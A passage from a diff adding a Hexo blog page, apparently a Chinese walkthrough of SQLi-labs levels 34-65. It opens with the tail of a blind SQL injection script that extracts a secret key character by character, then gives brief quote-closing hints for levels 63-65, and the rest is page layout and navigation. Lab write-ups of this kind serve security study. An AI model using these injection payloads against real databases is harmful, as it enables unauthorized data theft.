if(ascii(substr((select(group_concat(&quot;</span>+column_name+<span class="string">&quot;))from(challenges.&quot;</span>+table_name+<span class="string">&quot;)),%s,1))&gt;%s,1,0)%%23&quot;</span></span><br><span class="line">)</span><br><span class="line">print(secret_key)</span><br></pre></td></tr></table></figure>
+<p>唯快不破</p>
+<h2 id="level-63"><a href="#level-63" class="headerlink" title="level 63"></a>level 63</h2><p>闭合方式改为’</p>
+<h2 id="level-64"><a href="#level-64" class="headerlink" title="level 64"></a>level 64</h2><p>闭合方式改为))</p>
+<h2 id="level-65"><a href="#level-65" class="headerlink" title="level 65"></a>level 65</h2><p>闭合”)</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/07/20/SQLLABS%2020-33/" rel="prev" title="SQLLABS 20-33">
+      <i class="fa fa-chevron-left"></i> SQLLABS 20-33
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/07/20/SQLILABS%201-19%20/" rel="next" title="SQLLABS 1-19">
+      SQLLABS 1-19 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL1ILABS-34-65"><span class="nav-number">1.</span> <span class="nav-text">SQL1ILABS 34-65</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#level-34"><span class="nav-number">1.1.</span> <span class="nav-text">level 34</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-35"><span class="nav-number">1.2.</span> <span class="nav-text">level 35</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-36"><span class="nav-number">1.3.</span> <span class="nav-text">level 36</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-37"><span class="nav-number">1.4.</span> <span class="nav-text">level 37</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-38"><span class="nav-number">1.5.</span> <span class="nav-text">level 38</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-39"><span class="nav-number">1.6.</span> <span class="nav-text">level 39</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-40"><span class="nav-number">1.7.</span> <span class="nav-text">level 40</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-41"><span class="nav-number">1.8.</span> <span class="nav-text">level 41</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-42"><span class="nav-number">1.9.</span> <span class="nav-text">level 42</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-43"><span class="nav-number">1.10.</span> <span class="nav-text">level 43</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-44"><span class="nav-number">1.11.</span> <span class="nav-text">level 44</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-45"><span class="nav-number">1.12.</span> <span class="nav-text">level 45</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-46"><span class="nav-number">1.13.</span> <span class="nav-text">level 46</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-47"><span class="nav-number">1.14.</span> <span class="nav-text">level 47</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-48"><span class="nav-number">1.15.</span> <span class="nav-text">level 48</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-49"><span class="nav-number">1.16.</span> <span class="nav-text">level 49</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-50"><span class="nav-number">1.17.</span> <span class="nav-text">level 50</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-51"><span class="nav-number">1.18.</span> <span class="nav-text">level 51</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-52"><span class="nav-number">1.19.</span> <span class="nav-text">level 52</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-53"><span class="nav-number">1.20.</span> <span class="nav-text">level 53</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-54"><span class="nav-number">1.21.</span> <span class="nav-text">level 54</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-55"><span class="nav-number">1.22.</span> <span class="nav-text">level 55</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-56"><span class="nav-number">1.23.</span> <span class="nav-text">level 56</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-57"><span class="nav-number">1.24.</span> <span class="nav-text">level 57</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-58"><span class="nav-number">1.25.</span> <span class="nav-text">level 58</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-59"><span class="nav-number">1.26.</span> <span class="nav-text">level 59</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-60"><span class="nav-number">1.27.</span> <span class="nav-text">level 60</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-61"><span class="nav-number">1.28.</span> <span class="nav-text">level 61</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-62"><span class="nav-number">1.29.</span> <span class="nav-text">level 62</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-63"><span class="nav-number">1.30.</span> <span class="nav-text">level 63</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-64"><span class="nav-number">1.31.</span> <span class="nav-text">level 64</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level-65"><span class="nav-number">1.32.</span> <span class="nav-text">level 65</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Stary"
+      src="/images/D6C0CCF9F70347CF46810729EAC3C281.png">
+  <p class="site-author-name" itemprop="name">Stary</p>
+  <div class="site-description" itemprop="description">保持热情</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:450728870@qq.com" title="E-Mail → mailto:450728870@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Stary</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
